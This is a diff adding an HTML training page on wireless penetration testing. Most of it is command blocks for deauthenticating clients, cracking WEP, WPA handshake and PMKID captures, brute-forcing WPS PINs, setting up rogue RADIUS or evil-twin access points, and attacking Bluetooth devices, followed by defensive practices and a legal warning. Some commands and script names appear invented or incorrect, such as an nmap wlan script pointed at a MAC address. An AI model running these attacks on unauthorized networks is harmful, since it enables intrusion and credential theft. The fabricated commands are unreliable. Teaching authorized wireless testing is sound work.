@@ -1,0 +1,759 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wireless Network Security</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            line-height: 1.6;
+            color: #e2e8f0;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        .header {
+            background: linear-gradient(135deg, #0ea5e9 0%, #06b6d4 100%);
+            color: white;
+            padding: 40px;
+            border-radius: 15px;
+            margin-bottom: 40px;
+            text-align: center;
+        }
+        h1 {
+            margin: 0;
+            font-size: 2.5em;
+            font-weight: 700;
+        }
+        .subtitle {
+            margin-top: 10px;
+            font-size: 1.1em;
+            opacity: 0.9;
+        }
+        .content {
+            background: rgba(30, 41, 59, 0.7);
+            padding: 40px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(148, 163, 184, 0.1);
+        }
+        h2 {
+            color: #06b6d4;
+            border-bottom: 2px solid #06b6d4;
+            padding-bottom: 10px;
+            margin-top: 30px;
+        }
+        .highlight {
+            background: linear-gradient(135deg, #065f46 0%, #047857 100%);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border-left: 4px solid #10b981;
+        }
+        .command-box {
+            background: #0f172a;
+            border: 1px solid #374151;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+            color: #10b981;
+            overflow-x: auto;
+        }
+        .warning {
+            background: linear-gradient(135deg, #7c2d12 0%, #dc2626 100%);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border-left: 4px solid #ef4444;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+        .card {
+            background: rgba(15, 23, 42, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid rgba(148, 163, 184, 0.2);
+        }
+        .protocol-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        .protocol-table th,
+        .protocol-table td {
+            border: 1px solid #374151;
+            padding: 10px;
+            text-align: left;
+        }
+        .protocol-table th {
+            background: #1e293b;
+            color: #06b6d4;
+        }
+        .attack-flow {
+            background: #1e293b;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border-left: 4px solid #06b6d4;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Wireless Network Security</h1>
+            <p class="subtitle">Comprehensive wireless penetration testing and security assessment techniques</p>
+        </div>
+
+        <div class="content">
+            <h2>Introduction</h2>
+            <p>
+                Wireless networks present unique security challenges requiring specialized assessment techniques. 
+                This module covers comprehensive wireless security testing, from basic Wi-Fi reconnaissance to 
+                advanced attacks against modern wireless protocols. You'll learn to assess WPA/WPA2/WPA3 
+                implementations, perform wireless penetration testing, and understand emerging wireless technologies.
+            </p>
+
+            <h2>Learning Objectives</h2>
+            <ul>
+                <li>Understand wireless networking fundamentals and protocols</li>
+                <li>Master wireless reconnaissance and monitoring techniques</li>
+                <li>Learn WEP, WPA, and WPA2 attack methodologies</li>
+                <li>Explore WPA3 security enhancements and vulnerabilities</li>
+                <li>Practice enterprise wireless security assessment</li>
+                <li>Understand Bluetooth and other wireless technologies</li>
+                <li>Implement wireless security best practices</li>
+            </ul>
+
+            <h2>Wireless Fundamentals</h2>
+
+            <h3>IEEE 802.11 Standards</h3>
+            <table class="protocol-table">
+                <thead>
+                    <tr>
+                        <th>Standard</th>
+                        <th>Frequency</th>
+                        <th>Max Speed</th>
+                        <th>Range</th>
+                        <th>Key Features</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>802.11a</td>
+                        <td>5 GHz</td>
+                        <td>54 Mbps</td>
+                        <td>~35m indoor</td>
+                        <td>OFDM modulation</td>
+                    </tr>
+                    <tr>
+                        <td>802.11b</td>
+                        <td>2.4 GHz</td>
+                        <td>11 Mbps</td>
+                        <td>~38m indoor</td>
+                        <td>DSSS modulation</td>
+                    </tr>
+                    <tr>
+                        <td>802.11g</td>
+                        <td>2.4 GHz</td>
+                        <td>54 Mbps</td>
+                        <td>~38m indoor</td>
+                        <td>OFDM + backward compatibility</td>
+                    </tr>
+                    <tr>
+                        <td>802.11n (Wi-Fi 4)</td>
+                        <td>2.4/5 GHz</td>
+                        <td>600 Mbps</td>
+                        <td>~50m indoor</td>
+                        <td>MIMO, channel bonding</td>
+                    </tr>
+                    <tr>
+                        <td>802.11ac (Wi-Fi 5)</td>
+                        <td>5 GHz</td>
+                        <td>6.93 Gbps</td>
+                        <td>~35m indoor</td>
+                        <td>MU-MIMO, 256-QAM</td>
+                    </tr>
+                    <tr>
+                        <td>802.11ax (Wi-Fi 6)</td>
+                        <td>2.4/5 GHz</td>
+                        <td>9.6 Gbps</td>
+                        <td>~35m indoor</td>
+                        <td>OFDMA, BSS coloring</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Wireless Security Protocols</h3>
+            <div class="grid">
+                <div class="card">
+                    <h4>🔓 WEP (Wired Equivalent Privacy)</h4>
+                    <ul>
+                        <li><strong>Encryption:</strong> RC4 with 64/128-bit keys</li>
+                        <li><strong>Authentication:</strong> Open system or shared key</li>
+                        <li><strong>Vulnerabilities:</strong> IV reuse, weak keys, CRC32 flaws</li>
+                        <li><strong>Status:</strong> Deprecated, easily crackable</li>
+                        <li><strong>Attack time:</strong> Minutes to hours</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>🔒 WPA (Wi-Fi Protected Access)</h4>
+                    <ul>
+                        <li><strong>Encryption:</strong> TKIP (Temporal Key Integrity Protocol)</li>
+                        <li><strong>Authentication:</strong> Pre-shared key or 802.1X</li>
+                        <li><strong>Improvements:</strong> Dynamic keys, MIC protection</li>
+                        <li><strong>Vulnerabilities:</strong> TKIP weaknesses, dictionary attacks</li>
+                        <li><strong>Status:</strong> Transitional, limited deployment</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>🔐 WPA2 (Wi-Fi Protected Access 2)</h4>
+                    <ul>
+                        <li><strong>Encryption:</strong> AES-CCMP (Counter Mode CBC-MAC)</li>
+                        <li><strong>Authentication:</strong> PSK or 802.1X/EAP</li>
+                        <li><strong>Strengths:</strong> Strong encryption, widespread support</li>
+                        <li><strong>Vulnerabilities:</strong> Weak PSKs, KRACK attack</li>
+                        <li><strong>Status:</strong> Current standard, widely deployed</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>🛡️ WPA3 (Wi-Fi Protected Access 3)</h4>
+                    <ul>
+                        <li><strong>Encryption:</strong> AES-CCMP/GCMP with 128/192-bit</li>
+                        <li><strong>Authentication:</strong> SAE (Simultaneous Authentication of Equals)</li>
+                        <li><strong>Enhancements:</strong> Forward secrecy, brute-force protection</li>
+                        <li><strong>Features:</strong> Easy Connect, Enhanced Open</li>
+                        <li><strong>Status:</strong> Latest standard, emerging deployment</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h2>Wireless Reconnaissance</h2>
+
+            <h3>Environment Setup</h3>
+            <div class="command-box">
+# Wireless adapter preparation
+# Check adapter capabilities
+iwconfig
+lsusb
+airmon-ng
+
+# Put adapter in monitor mode
+sudo airmon-ng start wlan0
+sudo ip link set wlan0mon up
+
+# Alternative monitor mode setup
+sudo iw dev wlan0 set type monitor
+sudo ip link set wlan0 up
+
+# Channel hopping setup
+sudo airodump-ng wlan0mon --channel-hop
+
+# Check monitor mode status
+iwconfig wlan0mon
+</div>
+
+            <h3>Network Discovery and Enumeration</h3>
+            <div class="command-box">
+# Basic network discovery
+# Scan all channels
+sudo airodump-ng wlan0mon
+
+# Scan specific channel
+sudo airodump-ng wlan0mon --channel 6
+
+# Target specific BSSID
+sudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF --channel 6
+
+# Write capture to file
+sudo airodump-ng wlan0mon --write capture --output-format pcap
+
+# Extended scanning with wash (WPS detection)
+wash -i wlan0mon
+
+# Kismet wireless scanner
+sudo kismet -c wlan0mon
+
+# WiFi analyzer tools
+wavemon
+horst -i wlan0mon
+
+# Network mapping
+# Create target list
+echo "BSSID,ESSID,Channel,Encryption" > targets.csv
+sudo airodump-ng wlan0mon --write-interval 1 --output-format csv targets
+
+# Signal strength mapping
+sudo airodump-ng wlan0mon --berlin 60
+
+# Hidden SSID detection
+# Monitor for probe requests
+sudo airodump-ng wlan0mon --showack
+
+# Active probing
+sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+</div>
+
+            <h2>WEP Attacks</h2>
+
+            <h3>WEP Cracking Methodology</h3>
+            <div class="attack-flow">
+                <h4>WEP Attack Process:</h4>
+                <ol>
+                    <li>Monitor target network for traffic</li>
+                    <li>Capture sufficient IV packets (typically 20,000-50,000)</li>
+                    <li>Optionally generate traffic to speed collection</li>
+                    <li>Analyze captured IVs for weak keys</li>
+                    <li>Recover WEP key using statistical analysis</li>
+                </ol>
+            </div>
+
+            <div class="command-box">
+# WEP cracking with Aircrack-ng suite
+
+# 1. Start monitoring
+sudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF --channel 6 --write wep_capture
+
+# 2. Generate traffic (if needed)
+# Fake authentication
+sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# ARP replay attack (most effective)
+sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon
+
+# Fragmentation attack
+sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF wlan0mon
+
+# Chop-chop attack
+sudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF wlan0mon
+
+# 3. Crack the key
+sudo aircrack-ng wep_capture-01.cap
+
+# Alternative WEP tools
+# Wesside-ng (automated WEP cracking)
+sudo wesside-ng -i wlan0mon
+
+# Easside-ng (combined attack)
+sudo easside-ng wlan0mon
+
+# Manual IV analysis
+sudo ivstools --convert wep_capture-01.cap output.ivs
+sudo aircrack-ng output.ivs
+</div>
+
+            <h2>WPA/WPA2 Attacks</h2>
+
+            <h3>WPA/WPA2 Attack Vectors</h3>
+            <div class="grid">
+                <div class="card">
+                    <h4>🤝 4-Way Handshake Capture</h4>
+                    <ul>
+                        <li>Monitor authentication process</li>
+                        <li>Capture EAPOL frames</li>
+                        <li>Deauthenticate clients to force reconnection</li>
+                        <li>Offline dictionary/brute force attacks</li>
+                        <li>GPU-accelerated cracking</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>📡 PMKID Attack</h4>
+                    <ul>
+                        <li>Exploit client-less attack vector</li>
+                        <li>Target routers with PMKID caching</li>
+                        <li>No client interaction required</li>
+                        <li>Faster than handshake capture</li>
+                        <li>Works against many modern routers</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>🎭 Evil Twin Attacks</h4>
+                    <ul>
+                        <li>Create rogue access point</li>
+                        <li>Mimic legitimate network</li>
+                        <li>Capture credentials directly</li>
+                        <li>Man-in-the-middle attacks</li>
+                        <li>Social engineering integration</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>🔓 WPS Attacks</h4>
+                    <ul>
+                        <li>PIN brute force (Reaver)</li>
+                        <li>Pixie dust attack</li>
+                        <li>Offline PIN recovery</li>
+                        <li>PBC (Push Button Connect) exploitation</li>
+                        <li>Configuration bypass</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3>WPA/WPA2 Handshake Capture</h3>
+            <div class="command-box">
+# Handshake capture methodology
+
+# 1. Monitor target network
+sudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF --channel 6 --write handshake
+
+# 2. Deauthenticate clients to force reconnection
+# Target specific client
+sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c BB:BB:BB:BB:BB:BB wlan0mon
+
+# Broadcast deauth (all clients)
+sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# 3. Verify handshake capture
+sudo aircrack-ng handshake-01.cap
+
+# Alternative capture methods
+# Using tcpdump
+sudo tcpdump -i wlan0mon -w handshake.pcap
+
+# Using tshark
+sudo tshark -i wlan0mon -w handshake.pcap -f "subtype auth or subtype assoc-req or subtype reassoc-req"
+
+# Automated handshake capture
+# Wifite (automated wireless auditing)
+sudo wifite --wpa
+
+# Fern WiFi Cracker (GUI tool)
+sudo fern-wifi-cracker
+</div>
+
+            <h3>PMKID Attack</h3>
+            <div class="command-box">
+# PMKID attack using hcxdumptool and hashcat
+
+# 1. Capture PMKID
+sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
+
+# 2. Extract PMKID hash
+hcxpcapngtool -o hash.22000 capture.pcapng
+
+# 3. Crack with hashcat
+hashcat -m 22000 hash.22000 wordlist.txt
+
+# Alternative PMKID tools
+# hcxtools suite
+hcxpcapngtool -z pmkid.16800 capture.pcapng
+hashcat -m 16800 pmkid.16800 wordlist.txt
+
+# Automated PMKID attack
+sudo hcxdumptool -i wlan0mon --enable_status=15 -o capture.pcapng
+
+# Target specific network
+sudo hcxdumptool -i wlan0mon --filterlist=targets.txt --enable_status=1 -o capture.pcapng
+
+# Real-time PMKID extraction
+sudo hcxdumptool -i wlan0mon | hcxpcapngtool -o hash.22000 -
+</div>
+
+            <h2>WPS Attacks</h2>
+
+            <h3>WPS Vulnerability Assessment</h3>
+            <div class="command-box">
+# WPS enumeration and attacks
+
+# 1. WPS detection
+sudo wash -i wlan0mon
+
+# 2. Reaver PIN attack
+sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
+
+# 3. Pixie dust attack
+sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K
+
+# Advanced Reaver options
+# Session file for resuming
+sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -s session.wpc
+
+# Custom delay between attempts
+sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -d 60
+
+# Ignore rate limiting
+sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -r 3:60
+
+# Bully WPS attack tool
+sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -v 3
+
+# OneShot WPS attack
+python3 oneshot.py -i wlan0mon -b AA:BB:CC:DD:EE:FF -K
+
+# WPS PIN generation
+# Based on MAC address
+python3 wpspin.py AA:BB:CC:DD:EE:FF
+
+# Common PIN databases
+# Try default PINs first
+# 12345670, 00000000, 11111111, etc.
+</div>
+
+            <h2>WPA3 Security Assessment</h2>
+
+            <h3>WPA3 Attack Vectors</h3>
+            <div class="grid">
+                <div class="card">
+                    <h4>🔄 Dragonfly Attacks</h4>
+                    <ul>
+                        <li>Timing side-channel attacks</li>
+                        <li>Invalid curve attacks</li>
+                        <li>Cache-based side channels</li>
+                        <li>Downgrade attacks to WPA2</li>
+                        <li>Implementation vulnerabilities</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>📊 Transition Mode Exploitation</h4>
+                    <ul>
+                        <li>Mixed WPA2/WPA3 networks</li>
+                        <li>Client downgrade attacks</li>
+                        <li>Authentication bypass</li>
+                        <li>Legacy client targeting</li>
+                        <li>Configuration weaknesses</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>🕒 Timing Analysis</h4>
+                    <ul>
+                        <li>SAE password verification timing</li>
+                        <li>Hunting and pecking timing</li>
+                        <li>Statistical analysis</li>
+                        <li>Password dictionary optimization</li>
+                        <li>Implementation-specific flaws</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>🔧 Implementation Flaws</h4>
+                    <ul>
+                        <li>Vendor-specific vulnerabilities</li>
+                        <li>Firmware bugs</li>
+                        <li>Protocol deviation</li>
+                        <li>Memory corruption</li>
+                        <li>Configuration errors</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3>WPA3 Testing Tools</h3>
+            <div class="command-box">
+# WPA3 security assessment
+
+# Dragonblood attack tools
+git clone https://github.com/vanhoefm/dragonblood.git
+cd dragonblood
+
+# Test for timing leaks
+python3 krack-test-client.py
+
+# Downgrade attack testing
+python3 downgrade-attack.py wlan0mon
+
+# Side-channel analysis
+python3 timing-attack.py --interface wlan0mon --target AA:BB:CC:DD:EE:FF
+
+# WPA3 transition mode testing
+# Monitor for mixed-mode networks
+sudo airodump-ng wlan0mon | grep -E "(WPA2|WPA3)"
+
+# Test client downgrade susceptibility
+# Create WPA2-only network with same SSID
+hostapd wpa2_config.conf
+
+# WPA3 implementation testing
+# Test SAE group negotiation
+python3 sae-test.py --interface wlan0mon --bssid AA:BB:CC:DD:EE:FF
+
+# Test anti-clogging mechanisms
+python3 anti-clogging-test.py wlan0mon
+
+# Firmware vulnerability scanning
+# Check for known CVEs
+nmap --script wlan-* AA:BB:CC:DD:EE:FF
+</div>
+
+            <h2>Enterprise Wireless Security</h2>
+
+            <h3>802.1X/EAP Attack Vectors</h3>
+            <div class="command-box">
+# Enterprise wireless assessment
+
+# EAP method enumeration
+# Monitor EAP-Identity requests
+sudo tshark -i wlan0mon -f "subtype auth" -V
+
+# RADIUS server detection
+sudo nmap -p 1812,1813 --script radius-auth target_range
+
+# EAP-TLS certificate analysis
+# Extract certificates from traffic
+tshark -r capture.pcap -Y "eap" -T fields -e eap.code
+
+# Fake RADIUS server attack
+# Create rogue access point with RADIUS
+hostapd evil_ap.conf
+freeradius -X
+
+# EAP-MD5 hash capture
+# Monitor for MD5-Challenge
+sudo airodump-ng wlan0mon --write eap_capture
+
+# Extract EAP hashes
+john --format=eap-md5 eap_hashes.txt
+
+# Certificate spoofing
+# Create fake CA certificate
+openssl req -new -x509 -keyout ca.key -out ca.crt
+
+# EAP-FAST attack
+# Exploit automatic PAC provisioning
+python3 eap-fast-attack.py
+
+# PEAP/MSCHAPv2 attack
+# Capture MSCHAPv2 challenge/response
+asleap -r capture.pcap -f dictionary.txt
+
+# WPE (Wireless Pwnage Edition)
+# Capture credentials from enterprise networks
+./wpe.sh
+</div>
+
+            <h2>Bluetooth Security Assessment</h2>
+
+            <h3>Bluetooth Reconnaissance and Attacks</h3>
+            <div class="command-box">
+# Bluetooth security testing
+
+# Basic Bluetooth enumeration
+hciconfig
+hcitool scan
+hcitool lescan  # BLE scanning
+
+# SDP service enumeration
+sdptool browse 00:11:22:33:44:55
+
+# L2CAP ping
+l2ping 00:11:22:33:44:55
+
+# BlueZ security tools
+# Device information gathering
+hcitool info 00:11:22:33:44:55
+hcitool name 00:11:22:33:44:55
+
+# Bluetooth Low Energy (BLE) testing
+# BLE device scanning
+sudo hcitool lescan --duplicates
+
+# GATT service enumeration
+gatttool -b 00:11:22:33:44:55 --primary
+
+# Read characteristics
+gatttool -b 00:11:22:33:44:55 --char-read -a 0x0003
+
+# Bluetooth attack tools
+# Bluelog (device discovery logger)
+bluelog -i hci0 -o devices.log
+
+# BTScanner (inquiry scanner)
+btscanner -i hci0
+
+# Bluesnarfer (file access)
+bluesnarfer -b 00:11:22:33:44:55 -C 7
+
+# Blooover (obex push vulnerability)
+blooover -b 00:11:22:33:44:55
+
+# Car whisperer (hands-free exploitation)
+carwhisperer hci0 00:11:22:33:44:55
+
+# BLE security testing
+# Ubertooth (BLE packet capture)
+ubertooth-btle -f -c capture.pcap
+
+# Gattacker (BLE mitm)
+python gattacker.py -i hci0 -m mitm -t 00:11:22:33:44:55
+</div>
+
+            <h2>Wireless Defense and Countermeasures</h2>
+
+            <h3>Security Best Practices</h3>
+            <div class="grid">
+                <div class="card">
+                    <h4>🔐 Access Point Security</h4>
+                    <ul>
+                        <li>Use WPA3 with strong passphrases</li>
+                        <li>Disable WPS functionality</li>
+                        <li>Enable MAC address filtering (if applicable)</li>
+                        <li>Hide SSID broadcast (security through obscurity)</li>
+                        <li>Regular firmware updates</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>🏢 Enterprise Wireless</h4>
+                    <ul>
+                        <li>Implement 802.1X authentication</li>
+                        <li>Use certificate-based EAP methods</li>
+                        <li>Network segmentation and VLANs</li>
+                        <li>Wireless intrusion detection systems</li>
+                        <li>Regular security assessments</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>📊 Monitoring and Detection</h4>
+                    <ul>
+                        <li>Wireless IDS/IPS deployment</li>
+                        <li>Rogue AP detection</li>
+                        <li>Client behavior monitoring</li>
+                        <li>Spectrum analysis</li>
+                        <li>Security event correlation</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>📋 Policy and Procedures</h4>
+                    <ul>
+                        <li>Wireless security policies</li>
+                        <li>Guest network isolation</li>
+                        <li>BYOD security controls</li>
+                        <li>Incident response procedures</li>
+                        <li>User security awareness</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="warning">
+                <strong>Legal and Ethical Considerations:</strong>
+                <ul>
+                    <li>Only test networks you own or have explicit authorization to test</li>
+                    <li>Be aware of local radio frequency regulations</li>
+                    <li>Avoid interfering with critical wireless communications</li>
+                    <li>Respect privacy and data protection laws</li>
+                    <li>Use appropriate power levels to minimize interference</li>
+                    <li>Document all testing activities and findings</li>
+                    <li>Follow responsible disclosure practices</li>
+                </ul>
+            </div>
+
+            <div class="highlight">
+                <strong>Key Takeaway:</strong> Wireless security requires understanding diverse protocols, attack vectors, 
+                and defense mechanisms. Effective wireless security combines strong encryption, proper authentication, 
+                network monitoring, and regular security assessments to protect against evolving wireless threats.
+            </div>
+
+            <h2>Next Steps</h2>
+            <p>In the next module, we'll explore mobile application security, covering iOS and Android security models, mobile app testing methodologies, and mobile-specific attack vectors.</p>
+        </div>
+    </div>
+</body>
+</html>
